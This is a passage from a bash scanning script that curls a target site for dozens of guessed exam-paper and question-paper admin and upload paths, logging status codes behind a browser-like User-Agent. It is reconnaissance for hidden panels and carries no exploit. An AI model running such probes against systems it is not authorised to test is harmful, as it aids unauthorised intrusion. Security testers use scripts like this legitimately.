         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PPanel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PPanel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileFileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileFileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminDatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminDatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-MassUpload/"]: "
